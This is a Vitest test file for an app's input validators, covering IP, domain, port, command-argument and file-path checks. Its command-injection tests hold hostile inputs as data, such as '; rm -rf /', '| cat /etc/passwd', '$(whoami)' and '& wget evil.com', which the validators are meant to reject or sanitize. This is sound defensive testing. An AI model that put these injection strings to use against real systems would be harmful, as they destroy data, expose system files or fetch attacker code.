import { describe, it, expect } from 'vitest';
import {
  ipv4Schema, ipv6Schema, ipSchema,
  domainSchema, portSchema, commandArgSchema,
  sanitizeCommandArg, sanitizeFilePath,
  isValidIpInput, isValidIpv4, validateInput
} from '../src/utils/validators';

// ═══════════════════════════════════════════════════════════════════
// IP VALIDATION
// ═══════════════════════════════════════════════════════════════════
describe('IP Validation', () => {
  describe('IPv4', () => {
    it('accepts valid IPv4', () => {
      expect(ipv4Schema.safeParse('8.8.8.8').success).toBe(true);
      expect(ipv4Schema.safeParse('192.168.1.1').success).toBe(true);
      expect(ipv4Schema.safeParse('255.255.255.255').success).toBe(true);
    });

    it('rejects invalid IPv4', () => {
      expect(ipv4Schema.safeParse('999.999.999.999').success).toBe(false);
      expect(ipv4Schema.safeParse('1.2.3').success).toBe(false);
      expect(ipv4Schema.safeParse('abc.def.ghi.jkl').success).toBe(false);
      expect(ipv4Schema.safeParse('').success).toBe(false);
    });
  });

  describe('IPv6', () => {
    it('accepts valid IPv6', () => {
      expect(ipv6Schema.safeParse('2001:4860:4860::8888').success).toBe(true);
      expect(ipv6Schema.safeParse('::1').success).toBe(true);
      expect(ipv6Schema.safeParse('fe80::1').success).toBe(true);
    });

    it('rejects invalid IPv6', () => {
      expect(ipv6Schema.safeParse('not-an-ipv6').success).toBe(false);
      expect(ipv6Schema.safeParse('8.8.8.8').success).toBe(false);
    });
  });

  describe('isValidIpInput', () => {
    it('accepts both IPv4 and IPv6', () => {
      expect(isValidIpInput('1.1.1.1')).toBe(true);
      expect(isValidIpInput('::1')).toBe(true);
    });

    it('rejects garbage', () => {
      expect(isValidIpInput('hello')).toBe(false);
      expect(isValidIpInput('')).toBe(false);
      expect(isValidIpInput(null)).toBe(false);
      expect(isValidIpInput(undefined)).toBe(false);
    });
  });
});

// ═══════════════════════════════════════════════════════════════════
// DOMAIN VALIDATION
// ═══════════════════════════════════════════════════════════════════
describe('Domain Validation', () => {
  it('accepts valid domains', () => {
    expect(domainSchema.safeParse('aegis.net.tr').success).toBe(true);
    expect(domainSchema.safeParse('google.com').success).toBe(true);
    expect(domainSchema.safeParse('sub.domain.example.co.uk').success).toBe(true);
  });

  it('rejects invalid domains', () => {
    expect(domainSchema.safeParse('').success).toBe(false);
    expect(domainSchema.safeParse('just-a-word').success).toBe(false);
    expect(domainSchema.safeParse('.com').success).toBe(false);
    expect(domainSchema.safeParse('a.b').success).toBe(false); // TLD too short
  });
});

// ═══════════════════════════════════════════════════════════════════
// PORT VALIDATION
// ═══════════════════════════════════════════════════════════════════
describe('Port Validation', () => {
  it('accepts valid ports', () => {
    expect(portSchema.safeParse(80).success).toBe(true);
    expect(portSchema.safeParse(443).success).toBe(true);
    expect(portSchema.safeParse(1).success).toBe(true);
    expect(portSchema.safeParse(65535).success).toBe(true);
    expect(portSchema.safeParse('8080').success).toBe(true); // coerce from string
  });

  it('rejects invalid ports', () => {
    expect(portSchema.safeParse(0).success).toBe(false);
    expect(portSchema.safeParse(-1).success).toBe(false);
    expect(portSchema.safeParse(65536).success).toBe(false);
    expect(portSchema.safeParse('abc').success).toBe(false);
  });
});

// ═══════════════════════════════════════════════════════════════════
// COMMAND INJECTION PROTECTION
// ═══════════════════════════════════════════════════════════════════
describe('Command Injection Protection', () => {
  describe('commandArgSchema', () => {
    it('accepts clean input', () => {
      expect(commandArgSchema.safeParse('192.168.1.1').success).toBe(true);
      expect(commandArgSchema.safeParse('example.com').success).toBe(true);
      expect(commandArgSchema.safeParse('normal-text_123').success).toBe(true);
    });

    it('rejects semicolons', () => {
      expect(commandArgSchema.safeParse('; rm -rf /').success).toBe(false);
    });

    it('rejects $() subshell', () => {
      expect(commandArgSchema.safeParse('$(whoami)').success).toBe(false);
    });

    it('rejects backtick execution', () => {
      expect(commandArgSchema.safeParse('`id`').success).toBe(false);
    });

    it('rejects pipe operator', () => {
      expect(commandArgSchema.safeParse('| cat /etc/passwd').success).toBe(false);
    });

    it('rejects ampersand', () => {
      expect(commandArgSchema.safeParse('& wget evil.com').success).toBe(false);
    });

    it('rejects single quotes (SQL-style)', () => {
      expect(commandArgSchema.safeParse("'; DROP TABLE--").success).toBe(false);
    });

    it('rejects newlines', () => {
      expect(commandArgSchema.safeParse('safe\ninjection').success).toBe(false);
    });

    it('rejects carriage return', () => {
      expect(commandArgSchema.safeParse('safe\rinjection').success).toBe(false);
    });

    it('rejects null bytes', () => {
      expect(commandArgSchema.safeParse('safe\0injection').success).toBe(false);
    });

    it('rejects tabs', () => {
      expect(commandArgSchema.safeParse('safe\tinjection').success).toBe(false);
    });

    it('rejects percent encoding', () => {
      expect(commandArgSchema.safeParse('%0a').success).toBe(false);
    });

    it('rejects empty input', () => {
      expect(commandArgSchema.safeParse('').success).toBe(false);
    });
  });

  describe('sanitizeCommandArg', () => {
    it('strips dangerous characters', () => {
      expect(sanitizeCommandArg('; rm -rf /')).toBe(' rm -rf /');
      expect(sanitizeCommandArg('$(whoami)')).toBe('whoami');
      expect(sanitizeCommandArg('`id`')).toBe('id');
      expect(sanitizeCommandArg('test & echo pwned')).toBe('test  echo pwned');
    });

    it('preserves safe characters', () => {
      expect(sanitizeCommandArg('192.168.1.1')).toBe('192.168.1.1');
      expect(sanitizeCommandArg('example.com')).toBe('example.com');
      expect(sanitizeCommandArg('/usr/bin/nmap')).toBe('/usr/bin/nmap');
    });

    it('strips null bytes and control chars', () => {
      expect(sanitizeCommandArg('test\0evil')).toBe('testevil');
      expect(sanitizeCommandArg('test\nevil')).toBe('testevil');
      expect(sanitizeCommandArg('test\revil')).toBe('testevil');
    });
  });

  describe('sanitizeFilePath', () => {
    it('handles linux paths', () => {
      expect(sanitizeFilePath('/home/user/file.txt')).toBe('/home/user/file.txt');
    });

    it('converts slashes for windows', () => {
      expect(sanitizeFilePath('/home/user/file.txt', 'windows')).toBe('\\home\\user\\file.txt');
    });

    it('strips injection from paths', () => {
      expect(sanitizeFilePath('/tmp/$(whoami)/file')).toBe('/tmp/whoami/file');
    });
  });
});

// ═══════════════════════════════════════════════════════════════════
// validateInput HELPER
// ═══════════════════════════════════════════════════════════════════
describe('validateInput helper', () => {
  it('returns success with data for valid input', () => {
    const result = validateInput(ipv4Schema, '8.8.8.8');
    expect(result.success).toBe(true);
    expect(result.data).toBe('8.8.8.8');
    expect(result.error).toBeNull();
  });

  it('returns failure with error message for invalid input', () => {
    const result = validateInput(ipv4Schema, 'not-an-ip');
    expect(result.success).toBe(false);
    expect(result.data).toBeNull();
    expect(result.error).toBeTruthy();
  });
});
